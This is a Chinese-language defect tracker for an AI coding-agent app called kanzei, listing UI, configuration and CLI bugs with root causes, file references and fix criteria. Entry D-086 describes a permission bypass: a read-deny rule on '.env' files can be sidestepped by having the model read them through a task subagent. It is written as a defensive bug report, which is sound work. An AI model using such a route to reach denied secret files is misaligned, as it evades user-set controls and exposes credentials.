- 进展: 已修 5 项中的 4 项:①只带附件发送时补默认描述,附件不再被静默吞掉;②loadSettings 增加错误处理,失败时提示并停止渲染空表单;③启动链改为逐步捕获,任一步失败只提示该步并继续后续步骤;④快记表单改为提交期间禁用而非销毁,失败保留内容可重试。⑤系统通知 requestPermission 仍未补(需在合适时机请求,留待后续)。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-075 上下文成分浮层是死功能,状态栏承诺的点击查看无法打开 [open] (low)
- 复现: 运行一轮后点状态栏 token 文字(title 写着"点击查看上下文成分"),浮层永不出现。
- 根因: renderContextDetail 只写 innerHTML 从不移除 hidden 类(ui/main.js:811-825),而 `.hidden { display:none !important }`(style.css:329);全项目无其他代码碰 #context-detail(index.html:339)。
- 影响: 承诺的上下文透明功能完全不可用——而"上下文透明"是 G-001 明确的产品方向。即使修好显示也没有关闭路径(无 blur/再点切换),需一并补。
- 优先级: P2

## D-076 缺陷条目复杂度下拉硬编码 kind:"req",保存必失败 [fixed] (low)
- 复现: 展开任一未关闭缺陷,修改复杂度下拉,提示"复杂度保存失败"。
- 根因: ui/main.js:2203-2214 的分支条件包含 defect,但 invoke 时 kind 写死 "req";按需求表查 D-xxx 必然找不到。同段 `complexitySelect.title = "设置需求复杂度"` 也说明是从需求分支复制未改。
- 影响: 缺陷复杂度编辑确定性失效(R-047 声称已统一需求与缺陷的优先级/复杂度编辑,此处未覆盖)。
- 优先级: P2
- refs: D-047
- 修复: 复杂度下拉提交改用实际 kind,title 按类型区分;缺陷复杂度可正常保存。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-077 独立文档页拖拽启用条件读错筛选状态,可提交残缺顺序 [open] (low)
- 复现: ①侧栏筛选全为 all 但独立页把状态筛成 doing → 拖拽仍可用,提交不完整的 ID 序;②独立缺陷页选 P1 优先级(status 仍 all)→ 同样可拖拽并提交残缺顺序;③反向:侧栏有筛选时独立页无筛选却拖不了。
- 根因: reqDragEnabled/docDragEnabled(ui/main.js:2039-2046)只读侧栏的 reqFilters,而独立页实际按 documentFilters 过滤(2399-2403),且缺陷分支完全没有判断 documentFilters.defect.priority。代码注释自己写明"order 必须覆盖全部条目,有筛选时禁止拖拽"。
- 影响: 排序是 agent 取活顺序的唯一依据,提交残缺顺序会直接改变后续工作队列。D-032/D-036 的修复未覆盖独立页的筛选来源。
- 优先级: P2
- refs: D-032 D-036

## D-078 进程切换把自主推进降级为结伴开发,鞭挞静默失效 [open] (medium)
- 复现: 选"自主推进"并勾上鞭挞,切一次进程再切回来——模式变成"结伴开发",鞭挞胶囊仍亮着,但本轮结束后不再续跑,无任何提示。
- 根因: process_update 保存 profile 时只存 "dev"/"research" 丢掉了 dev-auto 档位(ui/main.js:1521-1523);switchProcess 回显时 `else if (target.profile === "dev") $("profile-select").value = "dev-pair"`(1846-1849),且以编程方式赋值不触发 change 监听器 → localStorage kz-profile 不更新、鞭挞兼容性检查不执行;此后 kz:done 处的 autoContinueAllowed() 不满足,整个鞭挞分支被跳过且无提示(916)。启动时 1457 直接恢复勾选也可能出现"鞭挞勾着但模式不允许"的死态。
- 影响: 自主推进(核心工作流)在进程切换后静默死亡,用户以为它还在干活。D-031 只修了页面刷新场景,未覆盖进程切换。
- 验收: profile 持久化保留 dev-auto 档位;回显后主动同步鞭挞可用性并在不兼容时明确提示。
- 优先级: P1
- refs: D-031

## D-079 运行中发送按钮禁用但排队功能存在,鼠标用户不可达 [open] (low)
- 复现: 运行中在输入框打字并选好"插入 steer",发送按钮是灰的点不动;但按 Ctrl+Enter 却能成功排队。
- 根因: setRunning(true) 禁用发送按钮(ui/main.js:287),而 sendText 专门实现了运行中的 queue/steer 投递分支(1277-1296),交付方式下拉也常驻可选;键盘路径直接调 send() 完全绕过按钮禁用(1571-1573)。
- 影响: 按钮状态与实际能力矛盾,排队/steer 这个卖点功能对鼠标操作不可达、可发现性为零。
- 验收: 运行中保持发送按钮可用并按交付方式提示"将排队/插队",或明确禁用整条路径(含快捷键)保持一致。
- 优先级: P2

## D-080 markdown agent 默认 steps=40 与既定默认 0 冲突 [open] (low)
- 复现: 在 ~/.kanzei/agents/ 下定义 agent 但不写 steps 字段,长任务在第 40 轮被强制收尾。
- 根因: kanzei-harness/src/markdown.rs:102 用 `unwrap_or(40)`,而 AgentDef 的 serde 默认是 default_steps()=0 且注释明言"0 = 无轮数上限(用户定调)"(defs.rs:69-75),内置 dev/research agent 也都显式 steps: 0(profiles.rs:143/262)。
- 影响: 用户自定义 agent 与内置 agent 行为不一致,且用户无从知道这个隐藏上限来自哪里。
- 验收: 两处默认统一为 0;补 markdown agent 未写 steps 时 steps=0 的解析测试。
- 优先级: P3

## D-081 update_check 对 dev 构建恒判有新版本,启动每次误报 [fixed] (low)
- 复现: 运行 dev 构建(未注入 KANZEI_BUILD_INFO)且仓库存在任意 release,启动 3 秒后必弹"发现新版本"。
- 根因: kanzei-app/src/main.rs:1498-1499 中 current_hash 对 dev 构建为 "dev",1530 的 `newer = !tag.is_empty() && !tag.contains("dev")` 恒为 true;前端启动静默检查(ui/main.js:3150-3155)据此弹 toast。
- 影响: 每次启动误报;若用户照做会用 release 覆盖本地 dev 版本,丢失未发布的改动。
- 优先级: P3
- 修复: update_check 增加 current_hash != "dev" 判定,dev 构建不再恒判有新版本。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-082 settings_save 以默认值重建全局配置,表单外字段静默丢失 [open] (medium)
- 复现: 手工编辑 ~/.kanzei/kanzei.toml 加入 [permissions] 规则,随后在设置页点一次保存,规则消失。
- 根因: kanzei-app/src/main.rs:1282-1323 用 `KanzeiConfig::default()` 起底,仅回填表单字段(models/proxy/profile.default/providers)后整体覆写全局配置文件,无备份。
- 影响: 用户手写的权限规则等非表单管理内容被静默抹掉;与"kanzei.toml schema 变更必须向后兼容、设置页表单必须透传新字段、禁止保存时丢字段"的项目规范直接冲突。
- 验收: 保存前先 load 现有配置再按字段合并;补"手写字段在保存后仍存在"的测试。
- 优先级: P1

## D-083 「总是允许」持久化失败被静默吞掉,成功时抹掉配置注释 [open] (medium)
- 复现: 项目 kanzei.toml 含未知字段或磁盘只读时按「总是允许」,本次运行生效但下次运行又弹窗,无任何提示;正常情况下保存后配置文件的注释与排版丢失。
- 根因: kanzei/src/main.rs:220 用 `let _ = append_allow_rule(...)` 吞掉错误;而 append_allow_rule 内部要求项目配置能被本二进制的严格 schema 解析(kanzei-harness/src/config.rs:216),失败即 Err;成功路径是整文件反序列化后 `toml::to_string_pretty` 重写(228),用户手写的注释、排版、键序全部丢失。
- 影响: 表现为"总是允许时灵时不灵"且无从排查;配置文件被引擎重排。
- 验收: 持久化失败时明确告知原因;改为文本级追加规则片段,不做整文件 round-trip。
- 优先级: P2
- refs: D-007

## D-084 配置结构体全量 deny_unknown_fields,新增字段会让旧二进制拒绝启动 [open] (medium)
- 复现: 桌面端升级后写入新配置节,再用旧版 kz 运行任意项目,直接报 "unknown field" 退出。
- 根因: kanzei-harness/src/config.rs:12/28/35/54/61 全部标注 deny_unknown_fields;load() 对全局与项目配置任一解析失败即返回错误(76-86),kz run 在 main.rs:62 直接 `?` 退出。
- 影响: CLI 与桌面端共享同一配置文件,严格模式使两端必须严格同版本;一处新字段炸掉所有项目,且报错无"删除该字段或升级"的引导。与项目规范"kanzei.toml schema 变更必须向后兼容(serde default)"冲突。
- 验收: 未知字段降级为告警并忽略,保留类型错误炸启动;补旧版本读取含新字段配置仍可运行的测试。
- 优先级: P2

## D-085 无 Ctrl+C 处理,CLI 中断后会话状态永久卡 running [open] (medium)
- 复现: 用 Ctrl+C 中断 kz run(CLI 唯一的停止手段),之后在桌面端查看该项目——显示为正在运行的幽灵会话。
- 根因: kanzei/src/main.rs:139 在 LLM 循环前 set_status("running"),复位只存在于 run_once 正常返回后的 Ok/Err 分支(268-296),Ctrl+C 直接杀进程两个分支都到不了;create_session 是 ON CONFLICT DO NOTHING(store.rs:118),下次运行不会先复位。CLI 与桌面端共用同一 project session id。
- 影响: state.db 中该会话永远 running,桌面端渲染成正在运行;本次对话的 conversation.updated 也未落库,中断轮次的历史丢失。
- 验收: 监听 ctrl_c 后落状态再退出,或启动时对 status=running 且无活跃进程的会话做陈旧性复位。
- 优先级: P2

## D-086 task 子代理不继承用户权限规则,read deny 可被旁路 [open] (medium)
- 复现: 在 kanzei.toml 配置 `action="read", resource="*/.env", effect="deny"`;主代理读被拦后,让模型用 task 子代理读同一文件,内容照常回传。
- 根因: task 调用明确跳过权限门禁(kanzei-core/src/runner.rs:478-480,"硬门禁在构造,不在评估"),但构造处只 add(SubagentBase)(kanzei/src/main.rs:233-236),ConfigComponent 不在内,用户规则不进入子代理快照;而 SubagentBase 给 read/glob/grep 一律 Allow *(kanzei-tools/src/subagent.rs:14-24)。
- 影响: "read deny 保护敏感文件"这一用户可表达的规则存在系统性旁路。"只读所以免检"的前提只对写安全成立,对读的保密性不成立。
- 验收: 子代理装配时叠加用户规则中 read/glob/grep 的 deny 条目(ask 可降为 deny,因子代理无人应答);补子代理读被拦截的测试。
- 优先级: P2

## D-087 kz --help 与拼错的子命令被当作 prompt 发给模型 [open] (low)
- 复现: 执行 `kz --help` 或 `kz -h`,或把 tracker 子命令打错一个字母。
- 根因: kanzei/src/main.rs:28-44 的顶层 match 只识别版本、五个 tracker 名词和 run,`Some(_) => run_cli(&args)` 把其余一切拼成 prompt 进入完整 agent 循环。
- 影响: 用户期待帮助文本,得到的是模型对字符串 "--help" 的自由发挥,外加 token 花费;该 prompt 还被写入 conversation.updated 持久化,后续每次运行都携带。
- 验收: 显式处理 -h/--help/help 并输出用法;以 `-` 开头的未知参数报错退出而非当 prompt。
- 优先级: P3

## D-088 CLI 会话历史无限累积且无清理入口 [open] (medium)
- 复现: 在同一项目里正常使用若干次 kz run,上下文与耗时持续增长,最终撞上下文上限。
- 根因: 每次 kz run 无条件取最新 conversation.updated 全量作为 prior(kanzei/src/main.rs:145-153),runner 以 prior.to_vec() 开局(runner.rs:206),运行结束又把累积后的完整 messages 写回(277-281);usage(47-52)中不存在 reset/new/continue 任何选项。
- 影响: token 成本每次递增、缓存命中下降,最终报错;用户唯一自救手段是手删 state.db,顺带丢掉全部事件。
- 验收: 提供 `kz run --new`(或 kz reset)显式开新会话;补新会话不携带旧 prior 的验证。
- 优先级: P2

## D-089 子代理进度事件在任务完结时未 drain,工具块卡在进行中 [open] (low)
- 复现: 子代理在收尾阶段密集发事件时,UI 上偶见 trace 末尾缺块,工具显示"进行中"但任务已结束。
- 根因: kanzei-core/src/runner.rs:455-472 的 select 循环在 jobs.next() 返回 None 时直接 break,此刻 rx 中可能仍有子代理临完成前发出的 TaskProgress(含 ToolEnd trace,703-711)未被消费;select 分支无偏向,完成分支可能先于积压的进度事件被轮询到,break 后 rx 随作用域丢弃。
- 影响: 仅 UI 显示,不影响正确性。
- 验收: break 前用 try_recv 清空缓冲事件。
- 优先级: P3

## D-090 bgEntries/diffSummary 不随 DOM 修剪,长时间运行内存与定时器负载无界增长 [open] (low)
- 复现: 一晚上鞭挞连跑数千次工具调用且不切项目/进程。
- 根因: ui/main.js:490-492 的修剪只删 DOM(`list.firstElementChild.remove()`),bgEntries Map(452)与 diffSummary 仅在 bgClear()(切项目/进程)时清空;687-691 的每秒 interval 遍历全 Map,对已脱离 DOM 的 detached 节点持续更新。
- 影响: 内存缓慢增长,detached DOM 持有 diff 大块内容;自用长跑恰是主用例。
- 验收: 修剪 DOM 时同步删除对应 Map 条目;定时器只遍历在册条目。
- 优先级: P3

## D-091 CSS 变量 --muted/--danger 未定义,失败状态失去红色语义 [fixed] (low)
- 复现: 侧栏出现 failed 测试记录或工作区失败状态,颜色与普通文字相同。
- 根因: style.css:144/153/154/174/657 使用 var(--danger)/var(--muted),而 :root 定义块(5-15)只有 --dim/--err,未定义的 var 使 color 回退为 inherit。
- 影响: 失败态失去颜色语义,红色警示恰恰在最需要的地方缺席。
- 验收: 补齐变量定义或改用既有 --err/--dim。
- 优先级: P3
- 修复: :root 补齐 --danger(映射 --err)与 --muted(映射 --dim);失败测试与工作区失败态恢复红色语义。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-092 语言切回中文时 title/placeholder 属性停留在英文 [open] (low)
- 复现: 设置页语言 zh→en→zh,悬停活动栏图标,tooltip 仍是英文,需重启才恢复。
- 根因: ui/main.js:52-59 文本节点用 WeakMap 存了原文可逆,但属性没有原文存储;切回中文时属性值已是英文,`I18N_EN["Attach"]` 为 undefined 直接跳过。
- 影响: 语言切换不完全可逆。
- 优先级: P3

## D-093 标题 🔔 提示只在 visibilitychange 复位,窗口可见时失焦回焦不清除 [open] (low)
- 复现: 双屏使用,kanzei 一直可见但焦点在别处,任务完成后回到窗口,标题仍是"🔔 运行完成 · kanzei"。
- 根因: ui/main.js:173-187 设置条件是 `!document.hasFocus() || document.hidden`(失焦即设),但复位只挂在 visibilitychange 上;窗口未被遮挡时失焦→回焦不产生该事件,缺一个 window focus 监听。
- 影响: 陈旧完成提示让人误以为又跑完一轮。
- 优先级: P3

## D-094 运行中点开历史对话无守卫,流式输出错位嵌入历史视图 [open] (low)
- 复现: 运行中随手点一条历史对话回看,当前运行的输出继续追加在历史对话末尾。
- 根因: 历史行点击(ui/main.js:2685-2692)没有 running 守卫(对照"新对话"按钮 2738-2741 有);renderRecoveredMessages 重置 currentAssistant 并清空 messages(2605-2610),kz:text 继续到达时新建气泡追加在历史末尾;loadConversation 里的 bgClear 还会清掉正在跑的活动轨迹。
- 影响: 两段对话混在一起,正在进行的运行轨迹丢失。
- 验收: 运行中点击历史对话给出明确提示或改为只读预览。
- 优先级: P3

## D-095 refs 跳转在独立文档页失效,特殊字符还会抛异常 [open] (low)
- 复现: 在独立文档页展开带 `refs: R-054` 的条目并点击该链接,页面无反应。
- 根因: ui/main.js:2188-2194 用全局 `document.querySelector([data-doc-id="..."])`,同一条目在侧栏与独立页各渲染一份且侧栏在前,而独立视图激活时侧栏副本被 `display:none` 隐藏 → scrollIntoView 对隐藏元素无效、高亮不可见;另 ref 值来自自由文本,含 `"` 或 `]` 时选择器语法错误直接抛未捕获异常。
- 影响: 关联跳转在最适合用它的页面上不工作。
- 验收: 在当前可见容器内查找目标;ref 值需转义后再构造选择器。
- 优先级: P3

## D-096 隔离工作树的差异查看只弹一次性 toast,无法阅读 [open] (low)
- 复现: 在隔离工作树里改了 20 个文件,点"差异"——几十个文件名塞进 2.6 秒即消失的小气泡,且文本不可选中复制。
- 根因: ui/main.js:1767-1769 直接 `toast(files.join("\n"))`;toast 存活 2600ms(131-138),body 设了 user-select:none 而 #toast 不在可选白名单(style.css:20-22)。
- 影响: 差异查看功能形同虚设,而项目里已有现成的 diff 查看器与文档查看器可复用。
- 验收: 改用应用内查看器展示文件列表与实际 diff 内容。
- 优先级: P2
- refs: R-050
